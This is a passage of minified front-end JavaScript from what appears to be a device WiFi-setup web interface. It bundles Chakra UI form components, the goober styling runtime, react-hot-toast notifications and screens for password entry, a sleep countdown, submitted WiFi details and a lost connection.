  [cO, uO] = Gm({ strict: !1, name: "FormControlContext" });
function dO(e) {
  const { isDisabled: t, isInvalid: n, isReadOnly: r, isRequired: o, ...a } = (function (e) {
      var t, n, r;
      const o = uO(),
          { id: a, disabled: i, readOnly: s, required: l, isRequired: c, isInvalid: u, isReadOnly: d, isDisabled: f, onFocus: p, onBlur: h, ...m } = e,
          g = e["aria-describedby"] ? [e["aria-describedby"]] : [];
      (null == o ? void 0 : o.hasFeedbackText) && (null == o ? void 0 : o.isInvalid) && g.push(o.feedbackId);
      (null == o ? void 0 : o.hasHelpText) && g.push(o.helpTextId);
      return {
          ...m,
          "aria-describedby": g.join(" ") || void 0,
          id: null != a ? a : null == o ? void 0 : o.id,
          isDisabled: null != (t = null != i ? i : f) ? t : null == o ? void 0 : o.isDisabled,
          isReadOnly: null != (n = null != s ? s : d) ? n : null == o ? void 0 : o.isReadOnly,
          isRequired: null != (r = null != l ? l : c) ? r : null == o ? void 0 : o.isRequired,
          isInvalid: null != u ? u : null == o ? void 0 : o.isInvalid,
          onFocus: Cg(null == o ? void 0 : o.onFocus, p),
          onBlur: Cg(null == o ? void 0 : o.onBlur, h),
      };
  })(e);
  return { ...a, disabled: t, readOnly: r, required: o, "aria-invalid": Eg(n), "aria-required": Eg(o), "aria-readonly": Eg(r) };
}
(oC(function (e, t) {
  const n = VE("Form", e),
      r = fy(e),
      { getRootProps: o, htmlProps: a, ...i } = (function (e) {
          const { id: t, isRequired: n, isInvalid: r, isDisabled: o, isReadOnly: a, ...i } = e,
              s = D.useId(),
              l = t || `field-${s}`,
              c = `${l}-label`,
              u = `${l}-feedback`,
              d = `${l}-helptext`,
              [f, p] = D.useState(!1),
              [h, m] = D.useState(!1),
              [g, v] = D.useState(!1),
              y = D.useCallback(
                  (e = {}, t = null) => ({
                      id: d,
                      ...e,
                      ref: Zj(t, (e) => {
                          e && m(!0);
                      }),
                  }),
                  [d]
              ),
              b = D.useCallback(
                  (e = {}, t = null) => ({ ...e, ref: t, "data-focus": kg(g), "data-disabled": kg(o), "data-invalid": kg(r), "data-readonly": kg(a), id: void 0 !== e.id ? e.id : c, htmlFor: void 0 !== e.htmlFor ? e.htmlFor : l }),
                  [l, o, g, r, a, c]
              ),
              x = D.useCallback(
                  (e = {}, t = null) => ({
                      id: u,
                      ...e,
                      ref: Zj(t, (e) => {
                          e && p(!0);
                      }),
                      "aria-live": "polite",
                  }),
                  [u]
              ),
              w = D.useCallback((e = {}, t = null) => ({ ...e, ...i, ref: t, role: "group" }), [i]),
              S = D.useCallback((e = {}, t = null) => ({ ...e, ref: t, role: "presentation", "aria-hidden": !0, children: e.children || "*" }), []);
          return {
              isRequired: !!n,
              isInvalid: !!r,
              isReadOnly: !!a,
              isDisabled: !!o,
              isFocused: !!g,
              onFocus: () => v(!0),
              onBlur: () => v(!1),
              hasFeedbackText: f,
              setHasFeedbackText: p,
              hasHelpText: h,
              setHasHelpText: m,
              id: l,
              labelId: c,
              feedbackId: u,
              helpTextId: d,
              htmlProps: i,
              getHelpTextProps: y,
              getErrorMessageProps: x,
              getRootProps: w,
              getLabelProps: b,
              getRequiredIndicatorProps: S,
          };
      })(r),
      s = bg("chakra-form-control", e.className);
  return Q.jsx(cO, { value: i, children: Q.jsx(sO, { value: n, children: Q.jsx(rC.div, { ...o({}, t), className: s, __css: n.container }) }) });
}).displayName = "FormControl"),
  (oC(function (e, t) {
      const n = uO(),
          r = lO(),
          o = bg("chakra-form__helper-text", e.className);
      return Q.jsx(rC.div, { ...(null == n ? void 0 : n.getHelpTextProps(e, t)), __css: r.helperText, className: o });
  }).displayName = "FormHelperText");
var [fO, pO] = Gm({ name: "InputGroupStylesContext", errorMessage: "useInputGroupStyles returned is 'undefined'. Seems you forgot to wrap the components in \"<InputGroup />\" " }),
  hO = oC(function (e, t) {
      const n = VE("Input", e),
          { children: r, className: o, ...a } = fy(e),
          i = bg("chakra-input__group", o),
          s = {},
          l = eO(r),
          c = n.field;
      l.forEach((e) => {
          var t, r;
          n &&
              (c && "InputLeftElement" === e.type.id && (s.paddingStart = null != (t = c.height) ? t : c.h),
              c && "InputRightElement" === e.type.id && (s.paddingEnd = null != (r = c.height) ? r : c.h),
              "InputRightAddon" === e.type.id && (s.borderEndRadius = 0),
              "InputLeftAddon" === e.type.id && (s.borderStartRadius = 0));
      });
      const u = l.map((t) => {
          var n, r;
          const o = (function (e) {
              const t = Object.assign({}, e);
              for (let n in t) void 0 === t[n] && delete t[n];
              return t;
          })({ size: (null == (n = t.props) ? void 0 : n.size) || e.size, variant: (null == (r = t.props) ? void 0 : r.variant) || e.variant });
          return "Input" !== t.type.id ? D.cloneElement(t, o) : D.cloneElement(t, Object.assign(o, s, t.props));
      });
      return Q.jsx(rC.div, { className: i, ref: t, __css: { width: "100%", display: "flex", position: "relative", isolation: "isolate" }, "data-group": !0, ...a, children: Q.jsx(fO, { value: n, children: u }) });
  });
hO.displayName = "InputGroup";
var mO = rC("div", { baseStyle: { display: "flex", alignItems: "center", justifyContent: "center", position: "absolute", top: "0", zIndex: 2 } }),
  gO = oC(function (e, t) {
      var n, r;
      const { placement: o = "left", ...a } = e,
          i = pO(),
          s = i.field,
          l = {
              ["left" === o ? "insetStart" : "insetEnd"]: "0",
              width: null != (n = null == s ? void 0 : s.height) ? n : null == s ? void 0 : s.h,
              height: null != (r = null == s ? void 0 : s.height) ? r : null == s ? void 0 : s.h,
              fontSize: null == s ? void 0 : s.fontSize,
              ...i.element,
          };
      return Q.jsx(mO, { ref: t, __css: l, ...a });
  });
(gO.id = "InputElement"), (gO.displayName = "InputElement");
var vO = oC(function (e, t) {
  const { className: n, ...r } = e,
      o = bg("chakra-input__left-element", n);
  return Q.jsx(gO, { ref: t, placement: "left", className: o, ...r });
});
(vO.id = "InputLeftElement"), (vO.displayName = "InputLeftElement");
var yO = oC(function (e, t) {
  const { className: n, ...r } = e,
      o = bg("chakra-input__right-element", n);
  return Q.jsx(gO, { ref: t, placement: "right", className: o, ...r });
});
(yO.id = "InputRightElement"), (yO.displayName = "InputRightElement");
var bO = oC(function (e, t) {
  const { htmlSize: n, ...r } = e,
      o = VE("Input", r),
      a = dO(fy(r)),
      i = bg("chakra-input", e.className);
  return Q.jsx(rC.input, { size: n, ...a, __css: o.field, ref: t, className: i });
});
(bO.displayName = "Input"), (bO.id = "Input");
var xO = (e) => Q.jsx(rC.div, { className: "chakra-stack__item", ...e, __css: { display: "inline-block", flex: "0 0 auto", minWidth: 0, ...e.__css } });
xO.displayName = "StackItem";
var wO = oC((e, t) => {
  const { isInline: n, direction: r, align: o, justify: a, spacing: i = "0.5rem", wrap: s, children: l, divider: c, className: u, shouldWrapChildren: d, ...f } = e,
      p = n ? "row" : null != r ? r : "column",
      h = D.useMemo(
          () =>
              (function (e) {
                  const { spacing: t, direction: n } = e,
                      r = {
                          column: { my: t, mx: 0, borderLeftWidth: 0, borderBottomWidth: "1px" },
                          "column-reverse": { my: t, mx: 0, borderLeftWidth: 0, borderBottomWidth: "1px" },
                          row: { mx: t, my: 0, borderLeftWidth: "1px", borderBottomWidth: 0 },
                          "row-reverse": { mx: t, my: 0, borderLeftWidth: "1px", borderBottomWidth: 0 },
                      };
                  return { "&": ((o = n), (a = (e) => r[e]), Array.isArray(o) ? o.map((e) => (null === e ? null : a(e))) : xg(o) ? Object.keys(o).reduce((e, t) => ((e[t] = a(o[t])), e), {}) : null != o ? a(o) : null) };
                  var o, a;
              })({ spacing: i, direction: p }),
          [i, p]
      ),
      m = !!c,
      g = !d && !m,
      v = D.useMemo(() => {
          const e = eO(l);
          return g
              ? e
              : e.map((t, n) => {
                    const r = void 0 !== t.key ? t.key : n,
                        o = n + 1 === e.length,
                        a = d ? Q.jsx(xO, { children: t }, r) : t;
                    if (!m) return a;
                    const i = D.cloneElement(c, { __css: h }),
                        s = o ? null : i;
                    return Q.jsxs(D.Fragment, { children: [a, s] }, r);
                });
      }, [c, h, m, g, d, l]),
      y = bg("chakra-stack", u);
  return Q.jsx(rC.div, { ref: t, display: "flex", alignItems: o, justifyContent: a, flexDirection: p, flexWrap: s, gap: m ? void 0 : i, className: y, ...f, children: v });
});
wO.displayName = "Stack";
var SO = oC((e, t) => Q.jsx(wO, { align: "center", ...e, direction: "row", ref: t }));
SO.displayName = "HStack";
var kO = oC(function (e, t) {
  const { children: n, placeholder: r, className: o, ...a } = e;
  return Q.jsxs(rC.select, { ...a, ref: t, className: bg("chakra-select", o), children: [r && Q.jsx("option", { value: "", children: r }), n] });
});
kO.displayName = "SelectField";
var EO = oC((e, t) => {
  var n;
  const r = VE("Select", e),
      { rootProps: o, placeholder: a, icon: i, color: s, height: l, h: c, minH: u, minHeight: d, iconColor: f, iconSize: p, ...h } = fy(e),
      [m, g] = (function (e, t) {
          const n = {},
              r = {};
          for (const [o, a] of Object.entries(e)) t.includes(o) ? (n[o] = a) : (r[o] = a);
          return [n, r];
      })(h, ny),
      v = dO(g),
      y = { width: "100%", height: "fit-content", position: "relative", color: s },
      b = { paddingEnd: "2rem", ...r.field, _focus: { zIndex: "unset", ...(null == (n = r.field) ? void 0 : n._focus) } };
  return Q.jsxs(rC.div, {
      className: "chakra-select__wrapper",
      __css: y,
      ...m,
      ...o,
      children: [
          Q.jsx(kO, { ref: t, height: null != c ? c : l, minH: null != u ? u : d, placeholder: a, ...v, __css: b, children: e.children }),
          Q.jsx(PO, { "data-disabled": kg(v.disabled), ...((f || s) && { color: f || s }), __css: r.icon, ...(p && { fontSize: p }), children: i }),
      ],
  });
});
EO.displayName = "Select";
var CO = (e) => Q.jsx("svg", { viewBox: "0 0 24 24", ...e, children: Q.jsx("path", { fill: "currentColor", d: "M16.59 8.59L12 13.17 7.41 8.59 6 10l6 6 6-6z" }) }),
  _O = rC("div", { baseStyle: { position: "absolute", display: "inline-flex", alignItems: "center", justifyContent: "center", pointerEvents: "none", top: "50%", transform: "translateY(-50%)" } }),
  PO = (e) => {
      const { children: t = Q.jsx(CO, {}), ...n } = e,
          r = D.cloneElement(t, { role: "presentation", className: "chakra-select__icon", focusable: !1, "aria-hidden": !0, style: { width: "1em", height: "1em", color: "currentColor" } });
      return Q.jsx(_O, { ...n, className: "chakra-select__icon-wrapper", children: D.isValidElement(t) ? r : null });
  };
PO.displayName = "SelectIcon";
var TO = (function (e) {
      const { viewBox: t = "0 0 24 24", d: n, displayName: r, defaultProps: o = {} } = e,
          a = D.Children.toArray(e.path),
          i = oC((e, r) => Q.jsx(Tj, { ref: r, viewBox: t, ...o, ...e, children: a.length ? a : Q.jsx("path", { fill: "currentColor", d: n }) }));
      return (i.displayName = r), i;
  })({
      displayName: "WarningTwoIcon",
      d:
          "M23.119,20,13.772,2.15h0a2,2,0,0,0-3.543,0L.881,20a2,2,0,0,0,1.772,2.928H21.347A2,2,0,0,0,23.119,20ZM11,8.423a1,1,0,0,1,2,0v6a1,1,0,1,1-2,0Zm1.05,11.51h-.028a1.528,1.528,0,0,1-1.522-1.47,1.476,1.476,0,0,1,1.448-1.53h.028A1.527,1.527,0,0,1,13.5,18.4,1.475,1.475,0,0,1,12.05,19.933Z",
  }),
  RO = { color: void 0, size: void 0, className: void 0, style: void 0, attr: void 0 },
  zO = $.createContext && $.createContext(RO),
  AO =
      (globalThis && globalThis.__assign) ||
      function () {
          return (
              (AO =
                  Object.assign ||
                  function (e) {
                      for (var t, n = 1, r = arguments.length; n < r; n++) for (var o in (t = arguments[n])) Object.prototype.hasOwnProperty.call(t, o) && (e[o] = t[o]);
                      return e;
                  }),
              AO.apply(this, arguments)
          );
      },
  jO =
      (globalThis && globalThis.__rest) ||
      function (e, t) {
          var n = {};
          for (var r in e) Object.prototype.hasOwnProperty.call(e, r) && t.indexOf(r) < 0 && (n[r] = e[r]);
          if (null != e && "function" == typeof Object.getOwnPropertySymbols) {
              var o = 0;
              for (r = Object.getOwnPropertySymbols(e); o < r.length; o++) t.indexOf(r[o]) < 0 && Object.prototype.propertyIsEnumerable.call(e, r[o]) && (n[r[o]] = e[r[o]]);
          }
          return n;
      };
function OO(e) {
  return (
      e &&
      e.map(function (e, t) {
          return $.createElement(e.tag, AO({ key: t }, e.attr), OO(e.child));
      })
  );
}
function FO(e) {
  return function (t) {
      return $.createElement(NO, AO({ attr: AO({}, e.attr) }, t), OO(e.child));
  };
}
function NO(e) {
  var t = function (t) {
      var n,
          r = e.attr,
          o = e.size,
          a = e.title,
          i = jO(e, ["attr", "size", "title"]),
          s = o || t.size || "1em";
      return (
          t.className && (n = t.className),
          e.className && (n = (n ? n + " " : "") + e.className),
          $.createElement(
              "svg",
              AO({ stroke: "currentColor", fill: "currentColor", strokeWidth: "0" }, t.attr, r, i, {
                  className: n,
                  style: AO(AO({ color: e.color || t.color }, t.style), e.style),
                  height: s,
                  width: s,
                  xmlns: "http://www.w3.org/2000/svg",
              }),
              a && $.createElement("title", null, a),
              e.children
          )
      );
  };
  return void 0 !== zO
      ? $.createElement(zO.Consumer, null, function (e) {
            return t(e);
        })
      : t(RO);
}
const MO = ({ handlePasswordInput: e }) => {
      const [t, n] = $.useState(!1);
      return Q.jsxs(hO, {
          size: "md",
          w: "300px",
          mt: "20px",
          bg: "b.1",
          borderRadius: "7px",
          _hover: { bg: "" },
          children: [
              Q.jsx(bO, { className: "password-input", pr: "4.5rem", focusBorderColor: "transparent", borderRadius: " .375rem", type: t ? "text" : "password", placeholder: "Enter Password", name: "password", onChange: e }),
              Q.jsx(yO, { width: "4.5rem", children: Q.jsx(aO, { className: "show-password-btn", h: "1.75rem", size: "sm", onClick: () => n(!t), children: t ? "Hide" : "Show" }) }),
          ],
      });
  },
  LO = ({ time: e, onTimerUpdate: t, onTimerEnd: n }) => {
      const [r, o] = D.useState(e);
      D.useEffect(() => {
          let e = null;
          return (
              (e = setInterval(() => {
                  o((e) => (e > 0 ? e - 1 : 0));
              }, 1e3)),
              () => {
                  clearInterval(e);
              }
          );
      }, []),
          D.useEffect(() => {
              0 == r && n(!0);
          }, [r]);
      return Q.jsxs(Q.Fragment, {
          children: [
              Q.jsx("h3", {
                  className: "timer",
                  children: ((e) => {
                      const t = e % 60;
                      return `${Math.floor(e / 60)
                          .toString()
                          .padStart(2, "0")}:${t.toString().padStart(2, "0")}`;
                  })(r),
              }),
              Q.jsx("h3", { className: "timer-text", children: "till I go to sleep" }),
          ],
      });
  };
function BO(e) {
  return FO({
      tag: "svg",
      attr: { viewBox: "0 0 512 512" },
      child: [
          {
              tag: "path",
              attr: {
                  d:
                      "M256 96c-81.5 0-163 33.6-221.5 88.3-3.3 3-3.4 8.1-.3 11.4l26.7 27.9c3.1 3.3 8.3 3.4 11.6.3 23.3-21.6 49.9-38.8 79.3-51 33-13.8 68.1-20.7 104.3-20.7s71.3 7 104.3 20.7c29.4 12.3 56 29.4 79.3 51 3.3 3.1 8.5 3 11.6-.3l26.7-27.9c3.1-3.2 3-8.3-.3-11.4C419 129.6 337.5 96 256 96z",
              },
          },
          {
              tag: "path",
              attr: {
                  d:
                      "M113.2 277.5l28.6 28.3c3.1 3 8 3.2 11.2.3 28.3-25.1 64.6-38.9 102.9-38.9s74.6 13.7 102.9 38.9c3.2 2.9 8.1 2.7 11.2-.3l28.6-28.3c3.3-3.3 3.2-8.6-.3-11.7-37.5-33.9-87.6-54.6-142.5-54.6s-105 20.7-142.5 54.6c-3.3 3.1-3.4 8.4-.1 11.7zM256 324.2c-23.4 0-44.6 9.8-59.4 25.5-3 3.2-2.9 8.1.2 11.2l53.4 52.7c3.2 3.2 8.4 3.2 11.6 0l53.4-52.7c3.1-3.1 3.2-8 .2-11.2-14.8-15.6-36-25.5-59.4-25.5z",
              },
          },
      ],
  })(e);
}
const IO = () =>
      Q.jsxs(Q.Fragment, { children: [Q.jsx("h1", { className: "sleep-title", children: "I'm now sleeping" }), Q.jsxs("h3", { className: "sleep-text", children: ["Press the power button", Q.jsx("br", {}), " once to wake me up"] })] }),
  DO = () =>
      Q.jsx(Q.Fragment, {
          children: Q.jsxs("div", {
              style: { marginTop: "170px", marginBottom: "220px", textAlign: "center" },
              children: [
                  Q.jsx(SO, { justifyContent: "center", alignItems: "center", pb: "20px", children: Q.jsx("h1", { className: "wifi-details-submitted-title", style: { fontSize: "25px" }, children: "WiFi Details Submitted" }) }),
                  Q.jsx("h3", { className: "wifi-details-submitted-text px-5 text-center", style: { textAlign: "center", lineHeight: "20px" }, children: "The device will now restart with the WiFi details provided" }),
              ],
          }),
      }),
  $O = () =>
      Q.jsx(Q.Fragment, {
          children: Q.jsxs("div", {
              style: { marginTop: "170px", marginBottom: "220px", textAlign: "center" },
              children: [
                  Q.jsxs(SO, {
                      justifyContent: "center",
                      alignItems: "center",
                      pb: "20px",
                      children: [Q.jsx("h1", { className: "connection-lost-title", style: { fontSize: "25px" }, children: "Connection Lost" }), Q.jsx(TO, { ml: "10px", className: "connection-lost-icon mt-1.5" })],
                  }),
                  Q.jsxs("h3", { className: "connection-lost-text", style: { textAlign: "center", lineHeight: "20px" }, children: ["Please try restarting the device if it hasn't ", Q.jsx("br", {}), "already restarted"] }),
              ],
          }),
      });
let VO,
  UO,
  WO,
  HO = { data: "" },
  qO = (e) => ("object" == typeof window ? ((e ? e.querySelector("#_goober") : window._goober) || Object.assign((e || document.head).appendChild(document.createElement("style")), { innerHTML: " ", id: "_goober" })).firstChild : e || HO),
  YO = /(?:([\u0080-\uFFFF\w-%@]+) *:? *([^{;]+?);|([^;}{]*?) *{)|(}\s*)/g,
  XO = /\/\*[^]*?\*\/|  +/g,
  GO = /\n+/g,
  QO = (e, t) => {
      let n = "",
          r = "",
          o = "";
      for (let a in e) {
          let i = e[a];
          "@" == a[0]
              ? "i" == a[1]
                  ? (n = a + " " + i + ";")
                  : (r += "f" == a[1] ? QO(i, a) : a + "{" + QO(i, "k" == a[1] ? "" : t) + "}")
              : "object" == typeof i
              ? (r += QO(i, t ? t.replace(/([^,])+/g, (e) => a.replace(/(^:.*)|([^,])+/g, (t) => (/&/.test(t) ? t.replace(/&/g, e) : e ? e + " " + t : t))) : a))
              : null != i && ((a = /^--/.test(a) ? a : a.replace(/[A-Z]/g, "-$&").toLowerCase()), (o += QO.p ? QO.p(a, i) : a + ":" + i + ";"));
      }
      return n + (t && o ? t + "{" + o + "}" : o) + r;
  },
  KO = {},
  ZO = (e) => {
      if ("object" == typeof e) {
          let t = "";
          for (let n in e) t += n + ZO(e[n]);
          return t;
      }
      return e;
  },
  JO = (e, t, n, r, o) => {
      let a = ZO(e),
          i =
              KO[a] ||
              (KO[a] = ((e) => {
                  let t = 0,
                      n = 11;
                  for (; t < e.length; ) n = (101 * n + e.charCodeAt(t++)) >>> 0;
                  return "go" + n;
              })(a));
      if (!KO[i]) {
          let t =
              a !== e
                  ? e
                  : ((e) => {
                        let t,
                            n,
                            r = [{}];
                        for (; (t = YO.exec(e.replace(XO, ""))); ) t[4] ? r.shift() : t[3] ? ((n = t[3].replace(GO, " ").trim()), r.unshift((r[0][n] = r[0][n] || {}))) : (r[0][t[1]] = t[2].replace(GO, " ").trim());
                        return r[0];
                    })(e);
          KO[i] = QO(o ? { ["@keyframes " + i]: t } : t, n ? "" : "." + i);
      }
      let s = n && KO.g ? KO.g : null;
      return n && (KO.g = KO[i]), (l = KO[i]), (c = t), (u = r), (d = s) ? (c.data = c.data.replace(d, l)) : -1 === c.data.indexOf(l) && (c.data = u ? l + c.data : c.data + l), i;
      var l, c, u, d;
  },
  eF = (e, t, n) =>
      e.reduce((e, r, o) => {
          let a = t[o];
          if (a && a.call) {
              let e = a(n),
                  t = (e && e.props && e.props.className) || (/^go/.test(e) && e);
              a = t ? "." + t : e && "object" == typeof e ? (e.props ? "" : QO(e, "")) : !1 === e ? "" : e;
          }
          return e + r + (null == a ? "" : a);
      }, "");
function tF(e) {
  let t = this || {},
      n = e.call ? e(t.p) : e;
  return JO(n.unshift ? (n.raw ? eF(n, [].slice.call(arguments, 1), t.p) : n.reduce((e, n) => Object.assign(e, n && n.call ? n(t.p) : n), {})) : n, qO(t.target), t.g, t.o, t.k);
}
tF.bind({ g: 1 });
let nF = tF.bind({ k: 1 });
function rF(e, t) {
  let n = this || {};
  return function () {
      let r = arguments;
      function o(a, i) {
          let s = Object.assign({}, a),
              l = s.className || o.className;
          (n.p = Object.assign({ theme: UO && UO() }, s)), (n.o = / *go\d+/.test(l)), (s.className = tF.apply(n, r) + (l ? " " + l : "")), t && (s.ref = i);
          let c = e;
          return e[0] && ((c = s.as || e), delete s.as), WO && c[0] && WO(s), VO(c, s);
      }
      return t ? t(o) : o;
  };
}
var oF = (e, t) => (((e) => "function" == typeof e)(e) ? e(t) : e),
  aF = (() => {
      let e = 0;
      return () => (++e).toString();
  })(),
  iF = (() => {
      let e;
      return () => {
          if (void 0 === e && typeof window < "u") {
              let t = matchMedia("(prefers-reduced-motion: reduce)");
              e = !t || t.matches;
          }
          return e;
      };
  })(),
  sF = new Map(),
  lF = (e) => {
      if (sF.has(e)) return;
      let t = setTimeout(() => {
          sF.delete(e), fF({ type: 4, toastId: e });
      }, 1e3);
      sF.set(e, t);
  },
  cF = (e, t) => {
      switch (t.type) {
          case 0:
              return { ...e, toasts: [t.toast, ...e.toasts].slice(0, 20) };
          case 1:
              return (
                  t.toast.id &&
                      ((e) => {
                          let t = sF.get(e);
                          t && clearTimeout(t);
                      })(t.toast.id),
                  { ...e, toasts: e.toasts.map((e) => (e.id === t.toast.id ? { ...e, ...t.toast } : e)) }
              );
          case 2:
              let { toast: n } = t;
              return e.toasts.find((e) => e.id === n.id) ? cF(e, { type: 1, toast: n }) : cF(e, { type: 0, toast: n });
          case 3:
              let { toastId: r } = t;
              return (
                  r
                      ? lF(r)
                      : e.toasts.forEach((e) => {
                            lF(e.id);
                        }),
                  { ...e, toasts: e.toasts.map((e) => (e.id === r || void 0 === r ? { ...e, visible: !1 } : e)) }
              );
          case 4:
              return void 0 === t.toastId ? { ...e, toasts: [] } : { ...e, toasts: e.toasts.filter((e) => e.id !== t.toastId) };
          case 5:
              return { ...e, pausedAt: t.time };
          case 6:
              let o = t.time - (e.pausedAt || 0);
              return { ...e, pausedAt: void 0, toasts: e.toasts.map((e) => ({ ...e, pauseDuration: e.pauseDuration + o })) };
      }
  },
  uF = [],
  dF = { toasts: [], pausedAt: void 0 },
  fF = (e) => {
      (dF = cF(dF, e)),
          uF.forEach((e) => {
              e(dF);
          });
  },
  pF = { blank: 4e3, error: 4e3, success: 2e3, loading: 1 / 0, custom: 4e3 },
  hF = (e) => (t, n) => {
      let r = ((e, t = "blank", n) => ({ createdAt: Date.now(), visible: !0, type: t, ariaProps: { role: "status", "aria-live": "polite" }, message: e, pauseDuration: 0, ...n, id: (null == n ? void 0 : n.id) || aF() }))(t, e, n);
      return fF({ type: 2, toast: r }), r.id;
  },
  mF = (e, t) => hF("blank")(e, t);
(mF.error = hF("error")),
  (mF.success = hF("success")),
  (mF.loading = hF("loading")),
  (mF.custom = hF("custom")),
  (mF.dismiss = (e) => {
      fF({ type: 3, toastId: e });
  }),
  (mF.remove = (e) => fF({ type: 4, toastId: e })),
  (mF.promise = (e, t, n) => {
      let r = mF.loading(t.loading, { ...n, ...(null == n ? void 0 : n.loading) });
      return (
          e
              .then((e) => (mF.success(oF(t.success, e), { id: r, ...n, ...(null == n ? void 0 : n.success) }), e))
              .catch((e) => {
                  mF.error(oF(t.error, e), { id: r, ...n, ...(null == n ? void 0 : n.error) });
              }),
          e
      );
  });
var gF,
  vF,
  yF,
  bF,
  xF = (e, t) => {
      fF({ type: 1, toast: { id: e, height: t } });
  },
  wF = () => {
      fF({ type: 5, time: Date.now() });
  },
  SF = (e) => {
      let { toasts: t, pausedAt: n } = ((e = {}) => {
          let [t, n] = D.useState(dF);
          D.useEffect(
              () => (
                  uF.push(n),
                  () => {
                      let e = uF.indexOf(n);
                      e > -1 && uF.splice(e, 1);
                  }
              ),
              [t]
          );
          let r = t.toasts.map((t) => {
              var n, r;
              return {
                  ...e,
                  ...e[t.type],
                  ...t,
                  duration: t.duration || (null == (n = e[t.type]) ? void 0 : n.duration) || (null == e ? void 0 : e.duration) || pF[t.type],
                  style: { ...e.style, ...(null == (r = e[t.type]) ? void 0 : r.style), ...t.style },
              };
          });
          return { ...t, toasts: r };
      })(e);
      D.useEffect(() => {
          if (n) return;
          let e = Date.now(),
              r = t.map((t) => {
                  if (t.duration === 1 / 0) return;
                  let n = (t.duration || 0) + t.pauseDuration - (e - t.createdAt);
                  if (!(n < 0)) return setTimeout(() => mF.dismiss(t.id), n);
                  t.visible && mF.dismiss(t.id);
              });
          return () => {
              r.forEach((e) => e && clearTimeout(e));
          };
      }, [t, n]);
      let r = D.useCallback(() => {
              n && fF({ type: 6, time: Date.now() });
          }, [n]),
          o = D.useCallback(
              (e, n) => {
                  let { reverseOrder: r = !1, gutter: o = 8, defaultPosition: a } = n || {},
                      i = t.filter((t) => (t.position || a) === (e.position || a) && t.height),
                      s = i.findIndex((t) => t.id === e.id),
                      l = i.filter((e, t) => t < s && e.visible).length;
                  return i
                      .filter((e) => e.visible)
                      .slice(...(r ? [l + 1] : [0, l]))
                      .reduce((e, t) => e + (t.height || 0) + o, 0);
              },
              [t]
          );
      return { toasts: t, handlers: { updateHeight: xF, startPause: wF, endPause: r, calculateOffset: o } };
  },
  kF = nF`
from {
transform: scale(0) rotate(45deg);
opacity: 0;
}
to {
transform: scale(1) rotate(45deg);
opacity: 1;
}`,
  EF = nF`
from {
transform: scale(0);
opacity: 0;
}
to {
transform: scale(1);
opacity: 1;
}`,
  CF = nF`
from {
transform: scale(0) rotate(90deg);
opacity: 0;
}
to {
transform: scale(1) rotate(90deg);
opacity: 1;
}`,
  _F = rF("div")`
width: 20px;
opacity: 0;
height: 20px;
border-radius: 10px;
background: ${(e) => e.primary || "#ff4b4b"};
position: relative;
transform: rotate(45deg);

animation: ${kF} 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275)
  forwards;
animation-delay: 100ms;

&:after,
&:before {
  content: '';
  animation: ${EF} 0.15s ease-out forwards;
  animation-delay: 150ms;
  position: absolute;
  border-radius: 3px;
  opacity: 0;
  background: ${(e) => e.secondary || "#fff"};
  bottom: 9px;
  left: 4px;
  height: 2px;
  width: 12px;
}

&:before {
  animation: ${CF} 0.15s ease-out forwards;
  animation-delay: 180ms;
  transform: rotate(90deg);
}
`,
  PF = nF`
from {
  transform: rotate(0deg);
}
to {
  transform: rotate(360deg);
}
`,
  TF = rF("div")`
width: 12px;
height: 12px;
box-sizing: border-box;
border: 2px solid;
border-radius: 100%;
border-color: ${(e) => e.secondary || "#e0e0e0"};
border-right-color: ${(e) => e.primary || "#616161"};
animation: ${PF} 1s linear infinite;
`,
  RF = nF`
from {
transform: scale(0) rotate(45deg);
opacity: 0;
}
to {
transform: scale(1) rotate(45deg);
opacity: 1;
}`,
  zF = nF`
0% {
height: 0;
width: 0;
opacity: 0;
}
40% {
height: 0;
width: 6px;
opacity: 1;
}
100% {
opacity: 1;
height: 10px;
}`,
  AF = rF("div")`
width: 20px;
opacity: 0;
height: 20px;
border-radius: 10px;
background: ${(e) => e.primary || "#61d345"};
position: relative;
transform: rotate(45deg);

animation: ${RF} 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275)
  forwards;
animation-delay: 100ms;
&:after {
  content: '';
  box-sizing: border-box;
  animation: ${zF} 0.2s ease-out forwards;
  opacity: 0;
  animation-delay: 200ms;
  position: absolute;
  border-right: 2px solid;
  border-bottom: 2px solid;
  border-color: ${(e) => e.secondary || "#fff"};
  bottom: 6px;
  left: 6px;
  height: 10px;
  width: 6px;
}
`,
  jF = rF("div")`
position: absolute;
`,
  OF = rF("div")`
position: relative;
display: flex;
justify-content: center;
align-items: center;
min-width: 20px;
min-height: 20px;
`,
  FF = nF`
from {
transform: scale(0.6);
opacity: 0.4;
}
to {
transform: scale(1);
opacity: 1;
}`,
  NF = rF("div")`
position: relative;
transform: scale(0.6);
opacity: 0.4;
min-width: 20px;
animation: ${FF} 0.3s 0.12s cubic-bezier(0.175, 0.885, 0.32, 1.275)
  forwards;
`,
  MF = ({ toast: e }) => {
      let { icon: t, type: n, iconTheme: r } = e;
      return void 0 !== t
          ? "string" == typeof t
              ? D.createElement(NF, null, t)
              : t
          : "blank" === n
          ? null
          : D.createElement(OF, null, D.createElement(TF, { ...r }), "loading" !== n && D.createElement(jF, null, "error" === n ? D.createElement(_F, { ...r }) : D.createElement(AF, { ...r })));
  },
  LF = (e) => `\n0% {transform: translate3d(0,${-200 * e}%,0) scale(.6); opacity:.5;}\n100% {transform: translate3d(0,0,0) scale(1); opacity:1;}\n`,
  BF = (e) => `\n0% {transform: translate3d(0,0,-1px) scale(1); opacity:1;}\n100% {transform: translate3d(0,${-150 * e}%,-1px) scale(.6); opacity:0;}\n`,
  IF = rF("div")`
display: flex;
align-items: center;
background: #fff;
color: #363636;
line-height: 1.3;
will-change: transform;
box-shadow: 0 3px 10px rgba(0, 0, 0, 0.1), 0 3px 3px rgba(0, 0, 0, 0.05);
max-width: 350px;
pointer-events: auto;
padding: 8px 10px;
border-radius: 8px;
`,
  DF = rF("div")`
display: flex;
justify-content: center;
margin: 4px 10px;
color: inherit;
flex: 1 1 auto;
white-space: pre-line;
`,
  $F = D.memo(({ toast: e, position: t, style: n, children: r }) => {
      let o = e.height
              ? ((e, t) => {
                    let n = e.includes("top") ? 1 : -1,
                        [r, o] = iF() ? ["0%{opacity:0;} 100%{opacity:1;}", "0%{opacity:1;} 100%{opacity:0;}"] : [LF(n), BF(n)];
                    return { animation: t ? `${nF(r)} 0.35s cubic-bezier(.21,1.02,.73,1) forwards` : `${nF(o)} 0.4s forwards cubic-bezier(.06,.71,.55,1)` };
                })(e.position || t || "top-center", e.visible)
